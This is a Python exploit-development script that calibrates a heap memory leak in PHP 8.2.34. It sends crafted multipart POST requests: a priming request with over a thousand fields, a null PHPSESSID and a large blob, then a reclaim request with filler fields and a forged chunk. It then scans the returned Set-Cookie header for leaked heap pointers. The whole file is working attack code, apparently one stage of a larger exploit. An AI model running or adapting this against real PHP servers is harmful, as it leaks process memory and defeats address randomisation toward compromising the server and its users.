#!/usr/bin/env python3
"""Systematic stage-1 leak calibration sweep on 8.2.34 (18111).
Vary: B filler count, forged-part size (with 0x1000 at offset 0x10), A big-field size.
Goal: a Set-Cookie >1000B containing 0x7F... heap pointers (= leak).
Reuses the exact exploit.py stage-1 structure (1001 small + file + big | PHPSESSID + fillers + forged).
"""
import http.client, struct, time, sys

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 18111
H = 0x7F0000000000

def scan(data, need=8):
    best = {}
    for off in range(len(data) - 8):
        v = int.from_bytes(data[off:off+8], "little")
        if H <= v < H + 0x10000000000:
            best[v & ~0x1FFFFF] = best.get(v & ~0x1FFFFF, 0) + 1
    if best:
        b, c = max(best.items(), key=lambda kv: kv[1])
        if c >= 8: return b
    return 0

def do(req_lines, body, timeout=90):
    c = http.client.HTTPConnection("127.0.0.1", PORT, timeout=timeout)
    c.putrequest("POST", "/", skip_host=True)
    for l in req_lines: c.putheader(l.split(":", 1)[0], l.split(":", 1)[1].strip())
    c.endheaders(); c.send(body)
    r = c.getresponse(); d = r.read(); c.close(); return d

def mp(parts, big=None):
    bd = "----b"; out = b""
    for name, val in parts:
        if isinstance(val, tuple):
            fn, content = val
            out += (f"--{bd}\r\nContent-Disposition: form-data; name=\"{name}\"; filename=\"{fn}\"\r\n"
                    f"Content-Type: application/octet-stream\r\n\r\n").encode() + content + b"\r\n"
        else:
            out += (f"--{bd}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n").encode() + val + b"\r\n"
    if big:
        out += (f"--{bd}\r\nContent-Disposition: form-data; name=\"big\"\r\n\r\n").encode() + big + b"\r\n"
    out += f"--{bd}--\r\n".encode(); return out

def cookie_of(r):
    for line in r.split(b"\r\n"):
        if line.lower().startswith(b"set-cookie:") and b"phpsessid" in line.lower():
            return line.split(b":", 1)[1].strip()
    return b""

def try_combo(fillers, fsize, big_mb, forged_off=0x10):
    # A (prime)
    prime = [(f"p{i:04d}", b"x") for i in range(1001)]
    prime.append(("PHPSESSID", b"\x00")); prime.append(("PHP_SESSION_UPLOAD_PROGRESS", b"pwn"))
    prime.append(("f", ("a.txt", b"A" * 64)))
    bodyA = mp(prime, big=b"B" * (big_mb * 1024 * 1024))
    try:
        do(["Content-Type: multipart/form-data; boundary=b", "Content-Length: %d" % len(bodyA)], bodyA, timeout=90)
    except Exception: pass
    time.sleep(0.3)
    # B (reclaim)
    rec = [("PHPSESSID", b"attacksessionid0001"), ("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
    for i in range(fillers):
        rec.append((str(1000+i), (f"v{i:04d}"+ "x"*44)[:48].encode()))
    forge = bytearray(b"A" * fsize)
    struct.pack_into("<Q", forge, forged_off, 0x1000)
    forge[forged_off+8] = ord("L")
    rec.append(("1999", bytes(forge)))
    r2 = do(["Content-Type: multipart/form-data; boundary=b", "Content-Length: %d" % len(mp(rec))], mp(rec), timeout=60)
    ck = cookie_of(r2); base = scan(ck)
    return base, len(ck)

combos = [
    (841, 79, 256), (841, 159, 256), (841, 239, 256), (841, 319, 256),
    (500, 79, 256), (1200, 79, 256), (200, 79, 256), (1500, 79, 256),
    (500, 159, 256), (1200, 159, 256), (841, 79, 128), (841, 79, 512),
    (841, 79, 256, 0x18), (841, 79, 256, 0x08),
]
print(f"=== leak calibration sweep on {PORT} ===")
for combo in combos:
    fillers, fsize, big_mb = combo[0], combo[1], combo[2]
    fo = combo[3] if len(combo) > 3 else 0x10
    base, cl = try_combo(fillers, fsize, big_mb, fo)
    verdict = "LEAK" if (base and cl > 1000) else "-"
    bs = ("0x%012x" % base) if base else "-"
    print(f"  fill={fillers} fsize={fsize} big={big_mb}M off={fo:#x} -> cookie={cl}B base={bs} {verdict}", flush=True)
    if base and cl > 1000:
        print("  *** FOUND A LEAKING COMBO ***", flush=True); break
print("sweep done")
